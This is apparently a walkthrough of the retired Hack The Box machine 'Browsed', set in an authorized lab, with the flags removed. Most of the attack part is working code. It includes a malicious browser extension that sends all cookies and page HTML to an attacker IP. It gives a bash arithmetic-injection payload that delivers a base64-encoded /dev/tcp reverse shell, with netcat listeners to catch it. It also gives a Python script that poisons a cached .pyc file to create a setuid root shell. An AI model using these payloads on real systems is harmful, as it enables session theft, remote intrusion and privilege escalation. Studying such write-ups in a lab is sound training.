# Browsed

> Retired Hack The Box machine. Public copy with flags removed. Authorized lab use only.

Step 1: Nmap

```
Command: nmap -A --top-port 10000 10.129.244.79 --min-rate 1000
```

```
Output:

Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-20 14:10 -0400
Nmap scan report for 10.129.244.79
Host is up (0.065s latency).
Not shown: 8378 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; prot
| ssh-hostkey: 
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Browsed
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:miklinux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   56.43 ms 10.10.14.1
2   57.05 ms 10.129.244.79

OS and Service detection performed. Please report any incorrect results at/ .
Nmap done: 1 IP address (1 host up) scanned in 20.54 seconds
```

Step 2: View page source

```
View Source Page and see /upload.php and in this web interface, it allow us to upload zip file
```

Step 3: Create a zip file for reverse shell

```
cat manifest.json                                                                                                                            
{
  "manifest_version": 3,
  "name": "ext",
  "version": "1.0",
  "permissions": ["cookies", "tabs", "webRequest"],
  "host_permissions": ["http://*/*", "https://*/*"],
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [{
    "matches": ["<all_urls>"],
    "js": ["content.js"]
  }]
}

```

```
cat background.js                                                                                                                                       
chrome.cookies.getAll({}, function(cookies) {
  fetch("http://10.10.14.99:8000/?c=" + btoa(JSON.stringify(cookies)));
});

```

```
cat content.js 
fetch("http://10.10.14.99:8000/?html=" + btoa(document.documentElement.innerHTML));
```

```
zip -j extension.zip manifest.json background.js content.js 
  adding: manifest.json (deflated 39%)
  adding: background.js (deflated 11%)
  adding: content.js (deflated 12%)
```


Step 4: Intercept the request via upload zip file

```
Step 1: Go to website and upload extension.zip

Step 2: On our kali start a listener:

nc -lvnp 8000

After 10 seconds, look at your listener, you will GET request as shown below:

Output:

nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.99] from (UNKNOWN) [10.129.244.79] 41372
GET /?c=W3siZG9tYWluIjoiYnJvd3NlZGludGVybmFscy5odGIiLCJob3N0T25seSI6dHJ1ZSwiaHR0cE9ubHkiOnRydWUsIm5hbWUiOiJpX2xpa2VfZ2l0ZWEiLCJwYXRoIjoiLyIsInNhbWVTaXRlIjoibGF4Iiwic2VjdXJlIjpmYWxzZSwic2Vzc2lvbiI6dHJ1ZSwic3RvcmVJZCI6IjAiLCJ2YWx1ZSI6IjcwZmMwYjk4NDYzZDdmMzUifSx7ImRvbWFpbiI6ImJyb3dzZWRpbnRlcm5hbHMuaHRiIiwiZXhwaXJhdGlvbkRhdGUiOjE3NzQxNjU1MTYuMjk4ODIzLCJob3N0T25seSI6dHJ1ZSwiaHR0cE9ubHkiOnRydWUsIm5hbWUiOiJfY3NyZiIsInBhdGgiOiIvIiwic2FtZVNpdGUiOiJsYXgiLCJzZWN1cmUiOmZhbHNlLCJzZXNzaW9uIjpmYWxzZSwic3RvcmVJZCI6IjAiLCJ2YWx1ZSI6Im01a1pIa0Q1UzZ0OF9JSXBVSTh4VlNTNVR6ODZNVGMzTkRBM09URXhOakk0TVRBMU1qUXpOdyJ9XQ== HTTP/1.1
Host: 10.10.14.99:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9


Decrypt it with base64:

echo "W3siZG9tYWluIjoiYnJvd3NlZGludGVybmFscy5odGIiLCJob3N0T25seSI6dHJ1ZSwiaHR0cE9ubHkiOnRydWUsIm5hbWUiOiJpX2xpa2VfZ2l0ZWEiLCJwYXRoIjoiLyIsInNhbWVTaXRlIjoibGF4Iiwic2VjdXJlIjpmYWxzZSwic2Vzc2lvbiI6dHJ1ZSwic3RvcmVJZCI6IjAiLCJ2YWx1ZSI6IjcwZmMwYjk4NDYzZDdmMzUifSx7ImRvbWFpbiI6ImJyb3dzZWRpbnRlcm5hbHMuaHRiIiwiZXhwaXJhdGlvbkRhdGUiOjE3NzQxNjU1MTYuMjk4ODIzLCJob3N0T25seSI6dHJ1ZSwiaHR0cE9ubHkiOnRydWUsIm5hbWUiOiJfY3NyZiIsInBhdGgiOiIvIiwic2FtZVNpdGUiOiJsYXgiLCJzZWN1cmUiOmZhbHNlLCJzZXNzaW9uIjpmYWxzZSwic3RvcmVJZCI6IjAiLCJ2YWx1ZSI6Im01a1pIa0Q1UzZ0OF9JSXBVSTh4VlNTNVR6ODZNVGMzTkRBM09URXhOakk0TVRBMU1qUXpOdyJ9XQ==" | base64 -d
[{"domain":"browsedinternals.htb","hostOnly":true,"httpOnly":true,"name":"i_like_gitea","path":"/","sameSite":"lax","secure":false,"session":true,"storeId":"0","value":"70fc0b98463d7f35"},{"domain":"browsedinternals.htb","expirationDate":1774165516.298823,"hostOnly":true,"httpOnly":true,"name":"_csrf","path":"/","sameSite":"lax","secure":false,"session":false,"storeId":"0","value":"m5kZHkD5S6t8_IIpUI8xVSS5Tz86MTc3NDA3OTExNjI4MTA1MjQzNw"}]
```

Step 4: Add new domain to /etc/hosts and find the critical info

```
Visit the new domain site: http://browsedinternals.htb

And then click on explore and see the larry github repo

And in this repo there are alof of files at I start looking each one by one carefully and found the vulernable at the: routines.sh and app.py
```

app.py 

In this file, it reveal a Flask app on 127.0.0.1:5000 with the critical endpoints:

```
@app.route('/routines/<rid>')
def routines(rid):
    subprocess.run(["./routines.sh", rid])
    return "Routine executed!"
```

routines.sh

```
#!/bin/bash

ROUTINE_LOG="/home/larry/markdownPreview/log/routine.log"
BACKUP_DIR="/home/larry/markdownPreview/backups"
DATA_DIR="/home/larry/markdownPreview/data"
TMP_DIR="/home/larry/markdownPreview/tmp"

log_action() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$ROUTINE_LOG"
}

if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  find "$TMP_DIR" -type f -name "*.tmp" -delete
  log_action "Routine 0: Temporary files cleaned."
  echo "Temporary files cleaned."

elif [[ "$1" -eq 1 ]]; then
  # Routine 1: Backup data
  tar -czf "$BACKUP_DIR/data_backup_$(date '+%Y%m%d_%H%M%S').tar.gz" "$DATA_DIR"
  log_action "Routine 1: Data backed up to $BACKUP_DIR."
  echo "Backup completed."

elif [[ "$1" -eq 2 ]]; then
  # Routine 2: Rotate logs
  find "$ROUTINE_LOG" -type f -name "*.log" -exec gzip {} \;
  log_action "Routine 2: Log files compressed."
  echo "Logs rotated."

elif [[ "$1" -eq 3 ]]; then
  # Routine 3: System info dump
  uname -a > "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  df -h >> "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  log_action "Routine 3: System info dumped."
  echo "System info saved."

else
  log_action "Unknown routine ID: $1"
  echo "Routine ID not implemented."
fi

```


```
if [[ "$1" -eq 0 ]]; then
    
elif [[ "$1" -eq 1 ]]; then

The vulnerability: 
`[[ "$1" -eq 0 ]]` uses bash arithmetic evaluation. The array subscript syntax `a[$(cmd)]` causes bash to execute `cmd` before the comparison.

**Proof of concept:**
http://127.0.0.1:5000/routines/a[$(id)]
→ executes id on the server
```

  
Step 5: change the content in bacground.js for reverseshell

```
cat background.js                                                                                                                              
const LHOST = "10.10.14.99";
const LPORT = "9001";

// Steal cookies
chrome.cookies.getAll({}, function(cookies) {
  fetch("http://" + LHOST + ":8000/?c=" + btoa(JSON.stringify(cookies)));
});

// Reverse shell via bash arithmetic injection
// Payload: a[$(echo BASE64 | base64 -d | bash)]
const cmd = "bash -c 'bash -i >& /dev/tcp/" + LHOST + "/" + LPORT + " 0>&1'";
const b64 = btoa(cmd);
const payload = "a[$(echo%20" + b64 + "%20|base64%20-d|bash)]";

fetch("http://127.0.0.1:5000/routines/" + payload, { mode: "no-cors" });
EOF
```

```
zip -j extension.zip manifest.json background.js content.js 
  adding: manifest.json (deflated 39%)
  adding: background.js (deflated 11%)
  adding: content.js (deflated 12%)
```


Step 6: Intercept the request via upload zip file

```
Step 1: Go to website and upload extension.zip

Step 2: On our kali start a listener:

Command: nc -lvnp 8000

After 10 seconds, look at your listener, you will GET request as shown below:

Output:

nc -lvnp 8000
listening on [any] 8000 ...
connect to [10.10.14.99] from (UNKNOWN) [10.129.244.79] 41372
GET /?c=W3siZG9tYWluIjoiYnJvd3NlZGludGVybmFscy5odGIiLCJob3N0T25seSI6dHJ1ZSwiaHR0cE9ubHkiOnRydWUsIm5hbWUiOiJpX2xpa2VfZ2l0ZWEiLCJwYXRoIjoiLyIsInNhbWVTaXRlIjoibGF4Iiwic2VjdXJlIjpmYWxzZSwic2Vzc2lvbiI6dHJ1ZSwic3RvcmVJZCI6IjAiLCJ2YWx1ZSI6IjcwZmMwYjk4NDYzZDdmMzUifSx7ImRvbWFpbiI6ImJyb3dzZWRpbnRlcm5hbHMuaHRiIiwiZXhwaXJhdGlvbkRhdGUiOjE3NzQxNjU1MTYuMjk4ODIzLCJob3N0T25seSI6dHJ1ZSwiaHR0cE9ubHkiOnRydWUsIm5hbWUiOiJfY3NyZiIsInBhdGgiOiIvIiwic2FtZVNpdGUiOiJsYXgiLCJzZWN1cmUiOmZhbHNlLCJzZXNzaW9uIjpmYWxzZSwic3RvcmVJZCI6IjAiLCJ2YWx1ZSI6Im01a1pIa0Q1UzZ0OF9JSXBVSTh4VlNTNVR6ODZNVGMzTkRBM09URXhOakk0TVRBMU1qUXpOdyJ9XQ== HTTP/1.1
Host: 10.10.14.99:8000
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9


Step 3: listner for shell

Command: nc -lvnp 9001
And got the pop up shell

```


Step 7: Get the user flag

```
larry@browsed:~$ cat user.txt
cat user.txt
[user flag removed]
```


Step 8: Privilege Escalation

```
Command: sudo -l
```

```
Output:

sudo -l
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```


```
cat /opt/extensiontool/extension_tool.py
cat /opt/extensiontool/extension_tool.py
#!/usr/bin/python3.12
import json
import os
from argparse import ArgumentParser
from extension_utils import validate_manifest, clean_temp_files                                                                                             
import zipfile

EXTENSION_DIR = '/opt/extensiontool/extensions/'

def bump_version(data, path, level='patch'):
    version = data["version"]
    major, minor, patch = map(int, version.split('.'))
    if level == 'major':
        major += 1
        minor = patch = 0
    elif level == 'minor':
        minor += 1
        patch = 0
    else:
        patch += 1

    new_version = f"{major}.{minor}.{patch}"
    data["version"] = new_version

    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)
    
    print(f"[+] Version bumped to {new_version}")
    return new_version

def package_extension(source_dir, output_file):
    temp_dir = '/opt/extensiontool/temp'
    if not os.path.exists(temp_dir):
        os.mkdir(temp_dir)
    output_file = os.path.basename(output_file)
    with zipfile.ZipFile(os.path.join(temp_dir,output_file), 'w', zipfile.ZIP_DEFLATED) as zipf:
        for foldername, subfolders, filenames in os.walk(source_dir):
            for filename in filenames:
                filepath = os.path.join(foldername, filename)
                arcname = os.path.relpath(filepath, source_dir)
                zipf.write(filepath, arcname)
    print(f"[+] Extension packaged as {temp_dir}/{output_file}")

def main():
    parser = ArgumentParser(description="Validate, bump version, and package a browser extension.")
    parser.add_argument('--ext', type=str, default='.', help='Which extension to load')
    parser.add_argument('--bump', choices=['major', 'minor', 'patch'], help='Version bump type')
    parser.add_argument('--zip', type=str, nargs='?', const='extension.zip', help='Output zip file name')
    parser.add_argument('--clean', action='store_true', help="Clean up temporary files after packaging")
    
    args = parser.parse_args()

    if args.clean:
        clean_temp_files(args.clean)

    args.ext = os.path.basename(args.ext)
    if not (args.ext in os.listdir(EXTENSION_DIR)):
        print(f"[X] Use one of the following extensions : {os.listdir(EXTENSION_DIR)}")
        exit(1)
    
    extension_path = os.path.join(EXTENSION_DIR, args.ext)
    manifest_path = os.path.join(extension_path, 'manifest.json')

    manifest_data = validate_manifest(manifest_path)
    
    # Possibly bump version
    if (args.bump):
        bump_version(manifest_data, manifest_path, args.bump)
    else:
        print('[-] Skipping version bumping')

    # Package the extension
    if (args.zip):
        package_extension(extension_path, args.zip)
    else:
        print('[-] Skipping packaging')


if __name__ == '__main__':
    main()

```

Find the vulnerable and here is the post exploitation script

```
cat > /tmp/xpl.py << 'EOF'
import os, py_compile, shutil, sys

orig = "/opt/extensiontool/extension_utils.py"
fake = "/tmp/extension_utils.py"
cache_dir = "/opt/extensiontool/__pycache__/"

# Get python version for pyc filename
vi = sys.version_info
pyc_name = f"extension_utils.cpython-{vi.major}{vi.minor}.pyc"
pyc_target = os.path.join(cache_dir, pyc_name)
print(f"[*] Target pyc: {pyc_target}")

orig_stat = os.stat(orig)
orig_size = orig_stat.st_size
orig_mtime = orig_stat.st_mtime
print(f"[*] Original size: {orig_size} | mtime: {orig_mtime}")

payload = """import os

def validate_manifest(path):
    os.system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash")
    return {}

def clean_temp_files(flag):
    pass
"""

current_size = len(payload.encode())
if current_size < orig_size:
    payload += "#" * (orig_size - current_size)
elif current_size > orig_size:
    print(f"[-] Payload too large by {current_size - orig_size} bytes")
    exit(1)

with open(fake, "w") as f:
    f.write(payload)

os.utime(fake, (orig_mtime, orig_mtime))
print(f"[+] Fake source ready")

compiled = f"/tmp/ext_compiled.pyc"
py_compile.compile(fake, cfile=compiled, invalidation_mode=py_compile.PycInvalidationMode.CHECKED_HASH)
# Try timestamp mode too
py_compile.compile(fake, cfile=compiled)
print(f"[+] Compiled")

shutil.copy(compiled, pyc_target)
print(f"[+] Poisoned: {pyc_target}")
print(f"\n[*] Now run:")
print(f"    sudo /opt/extensiontool/extension_tool.py --ext Fontify")
print(f"    /tmp/rootbash -p")
EOF

```


```
python3 /tmp/xpl.py

sudo /opt/extensiontool/extension_tool.py --ext Fontify

/tmp/rootbash -p

cat /root/root.txt

[root flag removed]
```
